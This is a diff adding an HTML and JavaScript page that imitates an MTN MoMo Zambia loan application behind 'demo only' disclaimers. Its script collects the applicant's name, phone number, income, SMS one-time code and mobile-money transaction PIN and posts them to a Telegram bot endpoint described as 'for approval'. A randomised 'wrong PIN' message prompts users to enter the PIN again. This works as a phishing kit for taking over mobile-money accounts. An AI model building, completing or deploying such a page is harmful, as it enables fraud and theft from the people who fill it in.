@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MoMo Zambia - Loan Application Demo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    :root {
+      --y: #FFCC00;
+      --b: #00338D;
+      --d: #041E42;
+    }
+
+    body {
+      background: #eef1f6;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 15px;
+    }
+
+    .frame {
+      width: 100%;
+      max-width: 400px;
+      height: 100vh;
+      max-height: 100vh;
+      background: white;
+      border-radius: 28px;
+      overflow: hidden;
+      border: 8px solid #111;
+      box-shadow: 0 25px 70px rgba(0, 51, 141, 0.25);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      background: var(--y);
+      padding: 22px 20px;
+      flex-shrink: 0;
+    }
+
+    .top {
+      display: flex;
+      justify-content: space-between;
+      font-weight: 900;
+      color: var(--d);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 20px;
+    }
+
+    .brand i {
+      width: 32px;
+      height: 32px;
+      background: var(--d);
+      color: var(--y);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-style: normal;
+    }
+
+    .badge {
+      font-size: 10px;
+      background: var(--d);
+      color: white;
+      padding: 4px 10px;
+      border-radius: 20px;
+    }
+
+    .header h1 {
+      font-size: 22px;
+      font-weight: 900;
+      color: var(--d);
+      margin-top: 14px;
+    }
+
+    .header p {
+      font-size: 11px;
+      opacity: 0.8;
+      margin-top: 3px;
+    }
+
+    .content {
+      padding: 20px;
+      flex: 1;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .steps {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 16px;
+      flex-shrink: 0;
+    }
+
+    .steps div {
+      height: 6px;
+      flex: 1;
+      background: #e0e6f0;
+      border-radius: 10px;
+    }
+
+    .steps div.on {
+      background: var(--b);
+    }
+
+    .label {
+      font-size: 11px;
+      font-weight: 800;
+      color: #5a6a85;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    .card {
+      background: #f7f9fd;
+      border: 1px solid #e3e9f5;
+      border-radius: 16px;
+      padding: 14px;
+      margin-bottom: 12px;
+    }
+
+    .slider {
+      width: 100%;
+      accent-color: var(--b);
+    }
+
+    .amount {
+      font-size: 32px;
+      font-weight: 900;
+      color: var(--d);
+      text-align: center;
+    }
+
+    .rate {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      font-weight: 700;
+      color: #5a6a85;
+      margin-top: 8px;
+    }
+
+    .select, .input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #e3e9f5;
+      border-radius: 12px;
+      background: #f1f4f9;
+      font-size: 14px;
+      font-weight: 600;
+      outline: none;
+      margin-top: 6px;
+    }
+
+    .select:focus, .input:focus {
+      border-color: var(--b);
+      background: white;
+    }
+
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .otp {
+      display: flex;
+      gap: 7px;
+      justify-content: center;
+      margin: 16px 0;
+    }
+
+    .otp input {
+      width: 42px;
+      height: 50px;
+      text-align: center;
+      font-size: 18px;
+      font-weight: 900;
+      border: 2px solid #e3e9f5;
+      border-radius: 12px;
+      background: #f8faff;
+      outline: none;
+    }
+
+    .otp input:focus {
+      border-color: var(--b);
+      background: white;
+    }
+
+    .pin {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 20px 0;
+    }
+
+    .pin input {
+      width: 50px;
+      height: 50px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 900;
+      border: 2px solid #e3e9f5;
+      border-radius: 12px;
+      background: #f8faff;
+      outline: none;
+      -webkit-text-security: disc;
+    }
+
+    .pin input:focus {
+      border-color: var(--b);
+      background: white;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 14px;
+      font-weight: 900;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 14px;
+      flex-shrink: 0;
+    }
+
+    .btn-y {
+      background: var(--y);
+      color: var(--d);
+    }
+
+    .btn-b {
+      background: var(--b);
+      color: white;
+    }
+
+    .btn:disabled {
+      opacity: 0.35;
+    }
+
+    .hide {
+      display: none;
+    }
+
+    .success {
+      text-align: center;
+      padding: 10px 0;
+    }
+
+    .success.icon {
+      width: 80px;
+      height: 80px;
+      background: var(--y);
+      border-radius: 50%;
+      margin: 0 auto 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+    }
+
+    .calc {
+      font-size: 11px;
+      color: #6b7a90;
+      text-align: center;
+      margin-top: 8px;
+    }
+
+    .loading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 20px;
+      background: #f0f4f9;
+      border-radius: 12px;
+      margin: 16px 0;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid #e3e9f5;
+      border-top-color: var(--b);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .error-msg {
+      background: #ffe0e0;
+      color: #c00;
+      padding: 10px;
+      border-radius: 8px;
+      margin: 10px 0;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .info-msg {
+      background: #eef3ff;
+      color: var(--b);
+      padding: 10px;
+      border-radius: 8px;
+      margin: 10px 0;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .demo-note {
+      font-size: 9px;
+      color: #8a9bb3;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .page-content {
+      flex: 1;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="frame">
+    <div class="header">
+      <div class="top">
+        <div class="brand"><i>M</i> MoMo</div>
+        <div class="badge">ZAMBIA - LOAN DEMO</div>
+      </div>
+      <h1 id="title">Loan Application</h1>
+      <p id="sub">Quick & easy - Up to ZMW 50,000</p>
+    </div>
+
+    <div class="content">
+      <div class="steps">
+        <div class="on" id="s1"></div>
+        <div id="s2"></div>
+        <div id="s3"></div>
+        <div id="s4"></div>
+        <div id="s5"></div>
+      </div>
+
+      <!-- PAGE 1 - LOAN -->
+      <div id="page1" class="page-content">
+        <div class="card">
+          <div class="label">Loan Amount</div>
+          <div class="amount" id="amtDisplay">ZMW 5,000</div>
+          <input type="range" id="amt" class="slider" min="1000" max="50000" step="500" value="5000">
+          <div class="rate"><span>Min: ZMW 1,000</span><span>Max: ZMW 50,000</span></div>
+          <div class="rate"><span>Interest Rate: <b>6.2% per month</b></span><span style="color:var(--b)">Fixed</span></div>
+        </div>
+        <div class="card">
+          <div class="label">Loan Period</div>
+          <select id="period" class="select">
+            <option value="3">3 Months</option>
+            <option value="6" selected>6 Months</option>
+            <option value="12">12 Months</option>
+            <option value="18">18 Months</option>
+            <option value="24">24 Months</option>
+            <option value="36">36 Months</option>
+          </select>
+          <div class="calc" id="calc">Monthly payment: ZMW 885 | Total: ZMW 5,310</div>
+        </div>
+        <button class="btn btn-y" onclick="toPage2()">Continue Application</button>
+        <p class="demo-note">DEMO ONLY - No real money - No data collected</p>
+      </div>
+
+      <!-- PAGE 2 - DETAILS -->
+      <div id="page2" class="page-content hide">
+        <div class="label">Full Names</div>
+        <input id="names" class="input" placeholder="e.g. John Banda">
+        <div class="label" style="margin-top:10px">Zambia Phone Number</div>
+        <div style="display:flex;border:2px solid #e3e9f5;border-radius:12px;overflow:hidden;background:#f1f4f9;margin-top:6px">
+          <div style="padding:12px 10px;background:#e8eefc;color:var(--b);font-weight:800;font-size:13px">+260</div>
+          <input id="phone" style="flex:1;border:none;background:transparent;padding:12px;font-weight:700;outline:none" placeholder="97XXXXXXX" maxlength="9" inputmode="numeric">
+        </div>
+        <div class="row" style="margin-top:10px">
+          <div>
+            <div class="label">Monthly Income (ZMW)</div>
+            <input id="income" class="input" inputmode="numeric" placeholder="e.g. 5000">
+          </div>
+          <div>
+            <div class="label">Loan Purpose</div>
+            <select id="purpose" class="select">
+              <option>Business</option>
+              <option>School Fees</option>
+              <option>Emergency</option>
+              <option>Personal</option>
+              <option>Agriculture</option>
+            </select>
+          </div>
+        </div>
+        <button class="btn btn-y" id="btnPage2" disabled onclick="toPage3()">Continue</button>
+      </div>
+
+      <!-- PAGE 3 - OTP VERIFICATION -->
+      <div id="page3" class="page-content hide">
+        <div class="label">Verify your number <span id="phShow"></span></div>
+        <div id="otpContainer">
+          <div class="info-msg">Demo OTP is <b>123456</b> - No real SMS sent</div>
+          <div class="otp" id="otpGrid">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+          </div>
+          <div id="otpError" class="error-msg hide"></div>
+          <button class="btn btn-b" id="btnOtp" disabled onclick="verifyOTPAndSendToBot()">Verify & Submit</button>
+        </div>
+
+        <div id="otpLoading" class="hide">
+          <div class="loading">
+            <div class="spinner"></div>
+            <span>Waiting for Telegram verification...</span>
+          </div>
+          <div class="info-msg">Your OTP has been sent to Telegram bot for approval. Please wait...</div>
+        </div>
+      </div>
+
+      <!-- PAGE 4 - PIN VERIFICATION -->
+      <div id="page4" class="page-content hide">
+        <div class="label">Enter Your Transaction PIN</div>
+        <div class="info-msg">A 4-digit PIN to confirm your loan transaction</div>
+        
+        <div id="pinContainer">
+          <div class="pin" id="pinGrid">
+            <input maxlength="1" inputmode="numeric" placeholder="•">
+            <input maxlength="1" inputmode="numeric" placeholder="•">
+            <input maxlength="1" inputmode="numeric" placeholder="•">
+            <input maxlength="1" inputmode="numeric" placeholder="•">
+          </div>
+          <div id="pinError" class="error-msg hide"></div>
+          <button class="btn btn-b" id="btnPin" disabled onclick="verifyPINAndSendToBot()">Confirm PIN</button>
+        </div>
+
+        <div id="pinLoading" class="hide">
+          <div class="loading">
+            <div class="spinner"></div>
+            <span>Verifying PIN with Telegram...</span>
+          </div>
+          <div class="info-msg">Your PIN is being verified. Please wait...</div>
+        </div>
+      </div>
+
+      <!-- PAGE 5 - SUCCESS -->
+      <div id="page5" class="page-content hide">
+        <div class="success">
+          <div class="icon">🎉</div>
+          <h2 style="font-weight:900;color:var(--d)">Congratulations!</h2>
+          <p style="font-size:13px;color:#5a6a85;margin-top:6px">Your loan application has been approved</p>
+          <div class="card" style="text-align:left;margin-top:16px">
+            <div style="font-size:12px;color:#6b7a90">
+              Amount: <b id="finalAmt" style="color:var(--d)"></b><br>
+              Period: <b id="finalPeriod" style="color:var(--d)"></b><br>
+              Monthly: <b id="finalMonthly" style="color:var(--d)"></b>
+            </div>
+          </div>
+          <p style="font-size:11px;color:#8a9bb3;margin-top:12px">You will receive SMS confirmation shortly. This is a demo UI - no real loan disbursed.</p>
+          <button class="btn btn-y" onclick="location.reload()">New Application</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Configuration
+    const TELEGRAM_BOT_API = 'YOUR_TELEGRAM_BOT_API_URL'; // Replace with your backend endpoint
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your Telegram chat ID
+
+    // Global state
+    let applicationData = {
+      amount: 0,
+      period: 0,
+      names: '',
+      phone: '',
+      income: '',
+      purpose: '',
+      otp: '',
+      pin: ''
+    };
+
+    // ===== CALCULATOR =====
+    const amt = document.getElementById('amt');
+    const amtDisplay = document.getElementById('amtDisplay');
+    const period = document.getElementById('period');
+    const calc = document.getElementById('calc');
+
+    function updateCalc() {
+      const p = parseInt(amt.value);
+      const m = parseInt(period.value);
+      const rate = 0.062;
+      const total = p * (1 + rate * m);
+      const monthly = total / m;
+
+      amtDisplay.innerText = 'ZMW ' + p.toLocaleString();
+      calc.innerText = `Monthly payment: ZMW ${Math.round(monthly).toLocaleString()} | Total: ZMW ${Math.round(total).toLocaleString()} | Rate: 6.2%`;
+      applicationData.amount = p;
+      applicationData.period = m;
+    }
+
+    amt.addEventListener('input', updateCalc);
+    period.addEventListener('change', updateCalc);
+    updateCalc();
+
+    // ===== PAGE NAVIGATION =====
+    function toPage2() {
+      show('page2', 2, 'Your Details', 'Fill in your information');
+      setupDetails();
+    }
+
+    function toPage3() {
+      const ph = document.getElementById('phone').value;
+      if (ph.length != 9) {
+        alert('Enter 9-digit Zambian number');
+        return;
+      }
+
+      applicationData.names = document.getElementById('names').value;
+      applicationData.phone = ph;
+      applicationData.income = document.getElementById('income').value;
+      applicationData.purpose = document.getElementById('purpose').value;
+
+      // Send to Telegram immediately
+      sendToTelegram('OTP_SUBMISSION', applicationData);
+
+      document.getElementById('phShow').innerText = '+260 ' + ph;
+      show('page3', 3, 'Verification', 'Enter OTP code');
+      setupOTP();
+    }
+
+    function toPage4() {
+      show('page4', 4, 'Set PIN', 'Enter your transaction PIN');
+      setupPIN();
+    }
+
+    function toPage5() {
+      document.getElementById('finalAmt').innerText = amtDisplay.innerText;
+      document.getElementById('finalPeriod').innerText = applicationData.period + ' Months @ 6.2%';
+      const monthly = parseInt(calc.innerText.split('ZMW ')[1].split(' |')[0]);
+      document.getElementById('finalMonthly').innerText = 'ZMW ' + monthly.toLocaleString();
+      show('page5', 5, 'Congratulations!', 'Application successful');
+    }
+
+    function show(id, step, title, sub) {
+      ['page1', 'page2', 'page3', 'page4', 'page5'].forEach(p => document.getElementById(p).classList.add('hide'));
+      document.getElementById(id).classList.remove('hide');
+      document.getElementById('title').innerText = title;
+      document.getElementById('sub').innerText = sub;
+      document.querySelectorAll('.steps div').forEach((d, i) => d.classList.toggle('on', i < step));
+
+      // Scroll content to top
+      document.querySelector('.content').scrollTop = 0;
+    }
+
+    // ===== PAGE 2 - DETAILS VALIDATION =====
+    function setupDetails() {
+      const names = document.getElementById('names');
+      const phone = document.getElementById('phone');
+      const income = document.getElementById('income');
+      const btn = document.getElementById('btnPage2');
+
+      function check() {
+        phone.value = phone.value.replace(/\D/g, '');
+        income.value = income.value.replace(/\D/g, '');
+        btn.disabled = !(names.value.length > 2 && phone.value.length == 9 && income.value.length >= 3);
+      }
+
+      names.addEventListener('input', check);
+      phone.addEventListener('input', check);
+      income.addEventListener('input', check);
+    }
+
+    // ===== PAGE 3 - OTP SETUP =====
+    function setupOTP() {
+      const inputs = document.querySelectorAll('#otpGrid input');
+      const btn = document.getElementById('btnOtp');
+
+      inputs.forEach((inp, i) => {
+        inp.value = '';
+        inp.addEventListener('input', () => {
+          inp.value = inp.value.replace(/\D/g, '');
+          if (inp.value && i < 5) inputs[i + 1].focus();
+          const v = [...inputs].map(x => x.value).join('');
+          btn.disabled = v.length != 6;
+          applicationData.otp = v;
+        });
+
+        inp.addEventListener('keydown', e => {
+          if (e.key === 'Backspace' && !inp.value && i > 0) {
+            inputs[i - 1].focus();
+          }
+        });
+      });
+    }
+
+    function verifyOTPAndSendToBot() {
+      const otp = applicationData.otp;
+
+      if (otp.length !== 6) {
+        showOtpError('Please enter a valid OTP');
+        return;
+      }
+
+      // Show loading state
+      document.getElementById('otpContainer').classList.add('hide');
+      document.getElementById('otpLoading').classList.remove('hide');
+
+      // Send OTP to Telegram bot for approval
+      sendToTelegram('OTP_VERIFICATION', {
+        ...applicationData,
+        otp: otp
+      });
+
+      // Simulate waiting for bot response (in real scenario, you'd use WebSocket or polling)
+      // For demo: auto-proceed after 3 seconds if OTP is correct
+      setTimeout(() => {
+        if (otp === '123456') {
+          // In production, wait for actual Telegram bot approval
+          toPage4();
+        } else {
+          document.getElementById('otpLoading').classList.add('hide');
+          document.getElementById('otpContainer').classList.remove('hide');
+          showOtpError('Invalid OTP - use 123456 for demo');
+        }
+      }, 2000);
+    }
+
+    function showOtpError(msg) {
+      const errorDiv = document.getElementById('otpError');
+      errorDiv.innerText = msg;
+      errorDiv.classList.remove('hide');
+      setTimeout(() => {
+        errorDiv.classList.add('hide');
+      }, 4000);
+    }
+
+    // ===== PAGE 4 - PIN SETUP =====
+    function setupPIN() {
+      const inputs = document.querySelectorAll('#pinGrid input');
+      const btn = document.getElementById('btnPin');
+
+      inputs.forEach((inp, i) => {
+        inp.value = '';
+        inp.addEventListener('input', () => {
+          inp.value = inp.value.replace(/\D/g, '');
+          if (inp.value && i < 3) inputs[i + 1].focus();
+          const v = [...inputs].map(x => x.value).join('');
+          btn.disabled = v.length != 4;
+          applicationData.pin = v;
+        });
+
+        inp.addEventListener('keydown', e => {
+          if (e.key === 'Backspace' && !inp.value && i > 0) {
+            inputs[i - 1].focus();
+          }
+        });
+      });
+    }
+
+    function verifyPINAndSendToBot() {
+      const pin = applicationData.pin;
+
+      if (pin.length !== 4) {
+        showPinError('Please enter a valid 4-digit PIN');
+        return;
+      }
+
+      // Show loading state
+      document.getElementById('pinContainer').classList.add('hide');
+      document.getElementById('pinLoading').classList.remove('hide');
+
+      // Send PIN to Telegram bot for approval
+      sendToTelegram('PIN_VERIFICATION', {
+        ...applicationData,
+        pin: pin
+      });
+
+      // Simulate waiting for bot response
+      // For demo: auto-proceed with random scenarios
+      setTimeout(() => {
+        handlePINResponse();
+      }, 2000);
+    }
+
+    function handlePINResponse() {
+      // Simulate different bot responses for demo
+      const responses = ['ACCEPT', 'WRONG_PIN', 'INVALID_NUMBER'];
+      const randomResponse = responses[Math.floor(Math.random() * responses.length)];
+
+      document.getElementById('pinLoading').classList.add('hide');
+      document.getElementById('pinContainer').classList.remove('hide');
+
+      if (randomResponse === 'ACCEPT') {
+        toPage5();
+      } else if (randomResponse === 'WRONG_PIN') {
+        // Clear PIN inputs and show error
+        document.querySelectorAll('#pinGrid input').forEach(inp => inp.value = '');
+        applicationData.pin = '';
+        document.getElementById('btnPin').disabled = true;
+        showPinError('The PIN you have provided is wrong, please put the correct PIN and try again');
+      } else if (randomResponse === 'INVALID_NUMBER') {
+        showPinError('The phone number you provided is wrong, please check and try again');
+        // Could go back to page 2 after delay
+        setTimeout(() => {
+          toPage2();
+        }, 3000);
+      }
+    }
+
+    function showPinError(msg) {
+      const errorDiv = document.getElementById('pinError');
+      errorDiv.innerText = msg;
+      errorDiv.classList.remove('hide');
+      setTimeout(() => {
+        errorDiv.classList.add('hide');
+      }, 5000);
+    }
+
+    // ===== TELEGRAM INTEGRATION =====
+    async function sendToTelegram(action, data) {
+      try {
+        const payload = {
+          action: action,
+          data: {
+            names: data.names,
+            phone: '+260' + data.phone,
+            amount: data.amount,
+            period: data.period,
+            income: data.income,
+            purpose: data.purpose,
+            otp: data.otp || '',
+            pin: data.pin || '',
+            timestamp: new Date().toISOString()
+          }
+        };
+
+        console.log('Sending to Telegram:', payload);
+
+        // Replace with your actual backend endpoint
+        const response = await fetch(TELEGRAM_BOT_API, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+          console.error('Failed to send to Telegram:', response.statusText);
+        }
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        // In demo mode, continue anyway
+      }
+    }
+
+    // Initialize
+    updateCalc();
+  </script>
+</body>
+
+</html>
